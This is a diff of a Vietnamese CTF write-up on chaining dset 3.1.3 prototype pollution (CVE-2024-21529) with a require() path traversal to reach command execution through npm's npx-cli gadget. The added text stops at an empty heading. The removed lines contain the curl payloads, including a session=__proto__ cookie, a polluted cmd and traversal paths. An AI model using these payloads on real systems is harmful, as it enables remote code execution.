@@ -20,75 +20,134 @@ Challenge cho sẵn source code một web fansite chạy Node.js + Express. Mụ
 Truy cập vào challenge, ta thấy một trang fansite của nhóm nhạc HepiHepi:
 
 ![image](./01-home.png)
+Kiểm tra source code được cho, nhận thấy có file `package.json`
+-> Đây là một bài `Node.js`
+## Kiểm tra `package.json` -> CVE-2024-21529
+Ta kiểm tra file thấy `dependencies` chứa thư viện lạ thuộc bên thứ ba: `dset`
 
-Bấm vào một thành viên, ta sang trang chi tiết với URL dạng `/member?memberID=member1`:
+1. Quan sát thấy các thư viện khác ngoài `dset` đều có version có thể tự động nâng minor/patch (có dấu `^` ở trước version), trong khi version của `dset` bị ghim cứng ở `3.1.3`
+![image](https://hackmd.io/_uploads/B1RlnPfofe.png)
+-> Bài cố ý pin phiên bản này vì nó có lỗ hổng đã biết. 
+Thử search `dset 3.1.3 vulnerability CVE` thì hiện ra 
+[CVE-2024-21529](https://security.snyk.io/vuln/SNYK-JS-DSET-7116691) ở các phiên bản từ 3.1.4 trở về trước
+![image](https://hackmd.io/_uploads/HJtZlufoGe.png)
 
-![image](./02-member.png)
+2. Ta có thể dùng `npm audit` tự động báo luôn package nào có lỗ hổng đã biết
+-> Tiện hơn nhiều so với việc kiểm tra toàn bộ dependency một lượt thay vì đọc tay từng thư viện.
 
-Trang này hiển thị thông tin lấy từ file `members/member1.js`. 
+:::info
+Cách sử dụng như sau:
+- `cd` vào thư mục chứa `package.json` (ở đây là `ez_web/src`)
+- Nếu chưa có `package-lock.json` thì 
+```bash!
+npm i --package-lock-only
+npm audit
+```
+- Nếu có rồi thì chỉ cần `npm audit`
+:::
 
-Giờ ta mở source `index.js` lên soi xem server xử lý những gì.
+![ctf_screenshot_under_1mb](https://hackmd.io/_uploads/rJeC0QdGifx.jpg)
 
-## Soi route /member — ngửi thấy path traversal
-
-Đầu tiên là route hiển thị thành viên:
-
+## Prototype Pollution là gì?
+### Định nghĩa và ví dụ
+Về cơ bản, ==prototype pollution== là lỗ hổng xảy ra khi kẻ tấn công ghi đè hoặc thêm `property` vào `Object.prototype` (`object` gốc dùng chung cho TOÀN BỘ `object` khác trong chương trình)
+-> Từ đó `property` đó xuất hiện trên toàn bộ `object` khác (bao gồm mọi `object` hiện tại và cả những `object` sẽ được tạo ra trong tương lai)
+Ví dụ dễ hiểu:
 ```javascript!
-app.get('/member', requireSession, (req, res) => {
-    memberID = req.query.memberID
-    memberStats = require(`./members/${memberID}.js`)
-    res.render('member', { member: memberStats })
-})
+// Bình thường — object không có "isAdmin"
+const anyObject = {};
+console.log(anyObject.isAdmin); // undefined — như mong đợi
+
+// Kẻ tấn công pollute Object.prototype
+Object.prototype.isAdmin = true;
+
+// Giờ MỌI object, kể cả cái vừa tạo sau đó, "tự nhiên" có isAdmin = true
+const brandNewObject = {};
+console.log(brandNewObject.isAdmin); // true  ← nguy hiểm!
 ```
 
-Dấu hiệu đập vào mắt ngay: input của user (`memberID`) được nối thẳng vào `require()` mà không hề lọc. 
-Hễ thấy một giá trị do người dùng điều khiển chui vào một hàm nhận đường dẫn file, phản xạ đầu tiên luôn là [path traversal](https://owasp.org/www-community/attacks/Path_Traversal): nhồi `../` để leo ra khỏi thư mục dự kiến. Ở đây đường dẫn là `./members/<memberID>.js`,
+Sau đó, attacker sẽ sử dụng `gadget` để gọi lại `property` mình đã thêm vào ở bước `prototype pollution`
+### Các khái niệm liên quan
+Vậy câu hỏi đặt ra là 
+1. `object`, `property`, `value`, `keypath` là gì?
+2. Cách đạt được `Object.prototype`?
+3. Cần bao nhiêu lần `__proto__` để đạt được `Object.prototype`?
+4. `gadget` là gì?
+-
+:::info
+`object` (đối tượng) là một cấu trúc dữ liệu gồm các cặp `key: value`
 
-Nếu `memberID` chứa `../` ta có thể bắt Node load một file `.js` bất kỳ trên hệ thống thay vì chỉ các file trong `members/`.
-Lỗ hổng này cho ta *load* một file `.js` có sẵn. 
+`property` (thuộc tính) là mỗi cặp `key-value` nằm trong object đó.
 
-Nhưng vấn đề là Load được file nào thì có ích?  -> Chưa rõ!!!!!
-=> Ta tạm cất ý tưởng "`require()` tùy ý" này sang một bên và soi tiếp.
-
-## change-theme + dset — ngửi thấy prototype pollution
-
-Để ý thêm cái nút mặt trời ở góc phải trên là tính năng đổi theme, thấy nó gọi tới một endpoint riêng.
-Cái nút đổi theme chính là route này, kèm middleware kiểm tra session:
-
-```javascript!
-const sessionStorage = {}
-
-function requireSession(req, res, next) {
-    const sessionID = req.cookies.session
-    if (!sessionID || !sessionStorage[sessionID]) {
-        return res.redirect('/')
-    }
-    req.session = sessionStorage[sessionID]
-    req.sessionID = sessionID
-    next()
-}
-
-app.post('/change-theme', requireSession, (req, res) => {
-    const { themeVar, themeVal } = req.body
-    if (typeof themeVar !== 'string' || typeof themeVal !== 'string') {
-        return res.status(400).send('themeVar and themeVal must be strings')
-    }
-    lib.dset(sessionStorage, [[req.sessionID], themeVar], themeVal)
-    res.send('Change theme successfuly')
-})
+`keypath` (đường dẫn key) dùng để trỏ tới một `property` nằm sâu bên trong khi `object` bị lồng nhiều cấp
+:::
+- Để trỏ được tới `Object.prototype` thì ta có các cách như sau, từ cơ bản đến bypass filter
+:::info
+Giả sử ta có `obj` là [object literals](https://www.geeksforgeeks.org/web-tech/object-literals/) như sau:
+```json!
+obj = { a: { b: {} } }
 ```
+1. Truy cập trực tiếp:
+``` javascript
+obj.__proto__ === Object.prototype;  // true
+```
+``` javascript
+obj.["__proto__"] === Object.prototype;  // true
+```
+2. Truy cập dù thông qua `obj` hay `a` hay `b` đều như nhau
+```javascript
+obj.__proto__ === Object.prototype;   // true — tầng gốc
+obj.a.__proto__ === Object.prototype;   // true — tầng 1
+obj.a.b.__proto__ === Object.prototype;   // true — tầng 2
+```
+3. Nếu `__proto__` bị ban mà không ban `constructor` và `prototype` (Mọi `object literal` có `constructor` trỏ về `Object`)
+-> `obj.constructor` = `Object`
+-> `obj.constructor.prototype` = `Object.prototype`
+```javascript
+obj.constructor.prototype === Object.prototype;   // true
+```
+:::
+- Số bước `__proto__` cần đi phụ thuộc vào cách object được tạo
+:::info
+```javascript
+{}.__proto__ === Object.prototype;                        // 1 bước (object literal)
+[].__proto__.__proto__ === Object.prototype;              // 2 bước (array → Array.prototype → Object.prototype)
+new Foo().__proto__.__proto__ === Object.prototype;       // 2 bước (Foo.prototype → Object.prototype)
+Object.create(null).__proto__;                            // undefined — KHÔNG đi được, chuỗi bị cắt
+```
+:::
+- `gadget` = "công cụ có sẵn bị lợi dụng sai mục đích"
+:::info
+`Gadget` là một đoạn code đã có sẵn trong chương trình/thư viện (không phải do kẻ tấn công viết ra), mà khi bị kích hoạt với đúng điều kiện, nó vô tình thực hiện một hành động nguy hiểm mà lập trình viên gốc không hề có ý định cho phép người dùng điều khiển.
+:::
 
-Chỗ `lib.dset(sessionStorage, ..., themeVal)` là cái gợn lên một dấu hiệu khác. `dset` là một thư viện chuyên để *set* một property lồng sâu vào object theo một key path, kiểu `dset(obj, 'a.b.c', val)`. Mà ở đây cả key (`themeVar`) lẫn value (`themeVal`) đều do user gửi lên. Hễ thấy một hàm ghi property vào object với tên property lấy từ input người dùng, ta phải nghĩ ngay tới [prototype pollution](https://portswigger.net/web-security/prototype-pollution).
+## Phân tích cách hoạt động của thư viện `dset`
 
-Vậy prototype pollution là gì? Trong JavaScript, gần như mọi object thông thường đều kế thừa từ `Object.prototype`. Khi ta đọc một property mà bản thân object không có, engine sẽ đi ngược lên *prototype chain* để tìm — đọc `obj.toString` chẳng hạn, `obj` không tự định nghĩa nhưng vẫn ra hàm, vì nó lấy từ `Object.prototype.toString`. Điểm chí mạng là ở chiều ngược lại: nếu kẻ tấn công ghi được vào `Object.prototype` (thường qua key đặc biệt `__proto__`), thì property vừa ghi tự dưng xuất hiện trên *mọi* object trong toàn chương trình. Tự nó chưa gây hại gì, nhưng nó là mồi: chỉ cần ở đâu đó có đoạn code đọc trúng property ấy rồi dùng vào việc nhạy cảm, ta sẽ lái được hành vi của nó. Đoạn code "đọc trúng rồi dùng" đó gọi là *gadget*. Có thể đọc kỹ hơn ở [PortSwigger](https://portswigger.net/web-security/prototype-pollution) và [HackTricks](https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.html).
+Trước tiên, ta cần biết cách thư viện này hoạt động. Đọc [API của `dset`](https://www.npmjs.com/package/dset/v/3.1.3#api).
+![image](https://hackmd.io/_uploads/S1I9Jdzsfg.png)
+Ta biết `dset` là 1 hàm sinh ra với mục đích truyền `value` vào một `object` thông qua đường dẫn `path`.
+Có thể đọc thêm [ví dụ](https://www.npmjs.com/package/dset/v/3.1.3#usage) để hiểu cách hàm `dset` hoạt động
 
-Giờ quay lại `dset`. Một thư viện tử tế sẽ phải chặn `__proto__`, nên ta mở `package.json` xem nó dùng bản nào — và thấy `dset` bị ghim cứng ở version `3.1.3`. Tra ra thì đúng bản dính [CVE-2024-21529](https://github.com/advisories/GHSA-f6v4-cf5j-vf3w) (vá ở `3.1.4`), một lỗ hổng prototype pollution. Vậy nghi ngờ của ta có cơ sở.
+Để hiểu hơn về lỗ hổng của phiên bản, ta so sánh source code giữa 2 phiên bản [3.1.3](https://app.unpkg.com/dset@3.1.3/files/merge/index.js) và [3.1.4](https://app.unpkg.com/dset@3.1.4/files/merge/index.js)
+Ở đây tôi sử dụng tool online là [code-diff-viewer](https://tanphatdigital.com/vi/tools/code-diff-viewer)
+![image](https://hackmd.io/_uploads/rJ7vu_foMx.png)
 
-### Vì sao dset 3.1.3 vẫn bị pollute
+Ta nhận thấy `k` được chuyển thủ công về kiểu dữ liệu string trước khi được check an toàn.
 
-Ta mở source của `dset@3.1.3` ra xem nó chặn thế nào:
+Quan sát đoạn code dùng để check:
+```javascript
+if (k === '__proto__' || k === 'constructor' || k === 'prototype') break;
+```
+Phép so sánh `===` trong JS là so sánh nghiêm ngặt cả kiểu dữ liệu lẫn giá trị, KHÔNG tự động ép kiểu.
+-> Ta phải ép kiểu thủ công với biến `k` chuyển về string trước khi so sánh với string `'__proto__'`, `constructor` và `prototype` để đảm bảo an toàn. Đó chính là cách fix lỗi của version 3.1.4. 
 
-```javascript!
+## Phân tích về lỗ hổng ở version 3.1.3 (CVE-2024-21529)
+Suy luận từ cách fix lỗi của version 3.1.4, ta biết lỗi của version 3.1.3 nằm ở việc không chuyển về `string` cho trùng kiểu dữ liệu trước mà đã check an toàn.
+=> Dẫn tới việc người dùng khai thác thông qua kiểu dữ liệu `array` ở `path`
+![image](https://hackmd.io/_uploads/H1kTujGife.png)
+
+Version 3.1.3:
+```javascript
 function dset(obj, keys, val) {
 	keys.split && (keys=keys.split('.'));
 	var i=0, l=keys.length, t=obj, x, k;
@@ -98,104 +157,65 @@ function dset(obj, keys, val) {
 		t = t[k] = (i === l) ? val : (typeof(x=t[k])===typeof(keys)) ? x : (keys[i]*0 !== 0 || !!~(''+keys[i]).indexOf('.')) ? {} : [];
 	}
 }
+
+exports.dset = dset;
 ```
+:::warning
+Lưu ý: 
+- Chỉ có path dạng array `[...,'y','z']` mới khai thác được vì giá trị của đầu có thể là 1 mảng con `['x']`==(nested array)== 
+**(Nếu giá trị đầu là `[x]` sẽ gây lỗi ngay lập tức vì chưa khai báo biến `x`)**
+-> `keys=[['x'],'y','z']` (thay cho `keys=['x','y','z']`) 
+=> `t[k]` = `t[['x']]` (`['x']` bị coerce thành string `'x'`)
+<=> `t[k]` = `t['x']` 
+(Lúc này đã bypass được bước check an toàn)
+- Path dạng string `'x.y.z'` thì chịu vì sau khi split thì cũng chỉ thành `['x','y','z']` chứ không thể nào là `[['x'],'y','z']`
+-> Ví dụ:
+`ka.hac.u` sau khi split -> `['ka','hac','u']`
+(Có cố gắng như nào cũng không biến được về dạng `[['ka'],'hac','u']`)
+:::
 
-Nó có check `k === '__proto__'` để chặn, trông thì kín. Nhưng đây là so sánh string nghiêm ngặt (`===`): nó chỉ chặn khi key *đúng y* là chuỗi `"__proto__"`. Giờ nhìn lại cách source gọi `dset`:
+## Đoạn code sử dụng `dset` có thể khai thác
+Quay trở lại với `index.js` của bài, ta thấy route `/change-theme` có sử dụng `dset`
+```javascript
+app.post('/change-theme', requireSession, (req, res) => {
+    const { themeVar, themeVal } = req.body
+    if (typeof themeVar !== 'string' || typeof themeVal !== 'string') {
+        return res.status(400).send('themeVar and themeVal must be strings')
+    }
+    lib.dset(sessionStorage, [[req.sessionID], themeVar], themeVal)
+    res.send('Change theme successfuly')
+})
 
+```
+Ở đây, người dùng kiểm soát được `req.sessionID`, `themeVar` và `themeVal` tùy ý. 
+ĐẶC BIỆT code có cấu trúc giống ta phân tích ở trên
 ```javascript!
 lib.dset(sessionStorage, [[req.sessionID], themeVar], themeVal)
 ```
+1. object: ==sessionStorage==
+2. path: ==`[`[req.sessionID], themeVar`]`==
+3. value: ==themeVal==
 
-Key path bị bọc một cách kì lạ: phần tử đầu không phải string mà là một *array* `[req.sessionID]`. Đây chính là chỗ CVE sống. Nếu ép được `req.sessionID` bằng `"__proto__"`, thì key đầu tiên trong path là mảng `["__proto__"]`, và điều kỳ diệu xảy ra:
+Khi đó, chỉ cần:
+1. `req.sessionID` = `'__proto__'` 
+-> Truy cập được `Object.prototype` để gây pollution 
+2. `themeVar` = `...`
+3. `themVal` = `...`
 
-1. Vòng lặp lấy `k = ["__proto__"]`. Dòng `k === '__proto__'` đang so một *array* với một *string* → luôn `false`, nên qua được hàng rào.
-2. Nhưng ngay dòng sau, khi array bị dùng làm key của object `t[k]`, JavaScript phải ép nó về string: `('' + ["__proto__"])` cho ra đúng chuỗi `"__proto__"`. Thế là `t` nhảy thẳng vào `Object.prototype`.
-3. Sang vòng lặp cuối với `k = themeVar` (giờ `i === l`), nó gán `Object.prototype[themeVar] = themeVal`.
+`themeVar` và `themeVal` tạm thời để đó vì chưa tìm được gadget để bị pollution
 
-Cái array `["__proto__"]` vừa qua mặt được lớp check string (vì so sánh kiểu khác nhau), lại vừa coerce ngược về `"__proto__"` khi làm key — đó là bản chất của CVE-2024-21529.
+## Quá trình truy tìm gadget
+### Path Traversal
+Bấm vào một thành viên, ta sang trang chi tiết với URL dạng `/member?memberID=member1`: 
+![image](./02-member.png)
 
-### Lách luôn cả session
-
-Còn một chi tiết: làm sao ép `req.sessionID = "__proto__"`, trong khi middleware `requireSession` bắt phải có session hợp lệ? Nhìn lại nó: lấy `sessionID` từ cookie, rồi check `sessionStorage[sessionID]` có truthy không. Mà `sessionStorage` là một object rỗng `{}`, nên `sessionStorage["__proto__"]` trả về chính `Object.prototype` — một giá trị truthy. Vậy chỉ cần gửi cookie `session=__proto__` là qua được middleware mà chẳng cần đăng nhập, và `req.sessionID` lúc này đúng bằng `"__proto__"`. Một mũi tên trúng hai đích.
-
-Tới đây ta đã có thể ghi một property bất kỳ (tên tùy, giá trị tùy) lên `Object.prototype`. Nhưng... rồi sao?
-
-## Pollution một mình chưa phải RCE — đi tìm gadget
-
-Pollute xong, trong tay ta chỉ là khả năng "làm mọi object trong chương trình tự nhiên mọc ra một property do ta đặt". Muốn biến nó thành RCE thì phải có một *gadget*: ở đâu đó trong code có dòng kiểu
-
+Ta thấy một chỗ đáng ngờ khi input của user (qua param `memberID`) được truyền vào `require()` mà không hề lọc. 
 ```javascript!
-if (options.cmd) { spawn(options.cmd, ...) }
+app.get('/member', requireSession, (req, res) => {
+    memberID = req.query.memberID
+    memberStats = require(`./members/${memberID}.js`)
+    res.render('member', { member: memberStats })
+})
 ```
-
-khi `options` không tự có `cmd`, nó sẽ ngửa lên prototype chain nhặt đúng `Object.prototype.cmd` mà ta đã gài, rồi đem đi `spawn`. Vấn đề là đọc hết source của app HepiHepi thì *không* thấy gadget nào gọi command cả. Pollution coi như treo đó.
-
-Đây đúng là lúc ta lôi lại ý tưởng đã cất ở đầu bài: path traversal cho phép `require()` một file `.js` bất kỳ. Nếu trên hệ thống có sẵn một module mà bên trong đã viết sẵn một gadget kiểu trên, thì ta chỉ việc pollute cho khớp property nó đọc, rồi dùng path traversal bắt Node nạp module đó để kích hoạt. Hai lỗ hổng rời rạc — một cái "ghi được lên prototype", một cái "nạp được module tùy ý" — ghép lại mới thành chuỗi.
-
-Module nào có gadget sẵn? `npm` là ứng viên kinh điển (xem [HackTricks — proto pollution to RCE](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution#rce)). Node cài global nên trên máy luôn tồn tại `/usr/lib/node_modules/npm/bin/npx-cli.js`. Khi file này được load, nó tự biến thành lời gọi `npm exec`:
-
-```javascript!
-// npx-cli.js
-const cli = require('../lib/cli.js')
-process.argv[1] = require.resolve('./npm-cli.js')
-process.argv.splice(2, 0, 'exec')
-```
-
-Lần theo `npm exec`, ta tới `libnpmexec`. Khi gọi mà không kèm package nào, nó rơi vào nhánh chạy script mặc định rồi đẩy xuống `@npmcli/run-script`. Mở `run-script-pkg.js`, gadget nằm đây:
-
-```javascript!
-let cmd = null
-if (options.cmd) {
-    cmd = options.cmd
-} else if (pkg.scripts && pkg.scripts[event]) {
-    cmd = pkg.scripts[event]
-}
-...
-const [spawnShell, spawnArgs, spawnOpts] = makeSpawnArgs({ ..., cmd, ..., scriptShell })
-const p = promiseSpawn(spawnShell, spawnArgs, spawnOpts, ...)
-```
-
-`options` là object cấu hình nội bộ của npm, bản thân nó không có property `cmd`. Nhưng vì ta đã pollute `Object.prototype.cmd`, câu `if (options.cmd)` ngửa lên prototype chain nhặt đúng command của ta. Sau đó `makeSpawnArgs` dựng lời gọi với `shell: scriptShell` (mặc định `sh`), nên server cuối cùng chạy `sh -c "<cmd>"`. Giờ thì rõ vì sao gadget này đọc đúng key tên `cmd` — và vì sao bước pollute phải nhắm đúng cái tên ấy.
-
-## Ghép chuỗi
-
-Đủ mảnh rồi, ta ráp lại theo thứ tự.
-
-Request 1 — pollute `Object.prototype.cmd` bằng chính câu lệnh muốn chạy:
-
-```bash!
-curl -b "session=__proto__" -X POST http://localhost:5005/change-theme \
-  --data-urlencode "themeVar=cmd" \
-  --data-urlencode "themeVal=/readflag > /tmp/pwn.js 2>&1; sleep 90"
-```
-
-Request 2 — kích hoạt gadget bằng path traversal, bắt `/member` require file npx-cli:
-
-```bash!
-curl -b "session=__proto__" \
-  "http://localhost:5005/member?memberID=../../usr/lib/node_modules/npm/bin/npx-cli"
-```
-
-:::info
-Từ `/app/members/`, hai lần `../` đưa về `/`, nên `require('./members/../../usr/.../npx-cli.js')` resolve ra đúng `/usr/lib/node_modules/npm/bin/npx-cli.js`.
-:::
-
-:::warning
-`npm exec` chạy bất đồng bộ nên request này trả response gần như tức thì, còn command thật mới chạy phía sau vài giây (npm phải khởi động Arborist, đọc config...). Đọc flag ngay lập tức sẽ hụt vì file chưa kịp sinh ra. Đoạn `sleep 90` trong payload có hai tác dụng: giữ cho tiến trình `sh` chưa kết thúc, và quan trọng hơn là níu server sống thêm — vì sau khi `npm exec` xong nó gọi `process.exit`, kéo sập luôn server Node.
-:::
-
-## Đọc flag
-
-`readflag` đã ghi output vào `/tmp/pwn.js`. Giờ ta lại tận dụng chính route `/member`, lần này bắt nó `require('/tmp/pwn.js')`. Nội dung file là flag dạng `W1{...}` — không phải JavaScript hợp lệ, nên Node ném `SyntaxError`, mà thông báo lỗi lại in ra đúng dòng đầu của file, tức là flag:
-
-```bash!
-curl -b "session=__proto__" "http://localhost:5005/member?memberID=../../tmp/pwn"
-```
-
-![image](./03-flag.png)
-
--> Flag: `W1{fake_flag}`
-
-:::info
-Bản deploy local trong Docker ship sẵn `flag.txt` là placeholder `W1{fake_flag}`, nên exploit chạy ra đúng chuỗi đó. Trên server thật của giải, cũng chuỗi lệnh này sẽ lộ ra flag thật theo format `W1{...}`.
-:::
+=> Có thể dùng `Path Traversal` để load một file `.js` bất kỳ trên hệ thống
+###
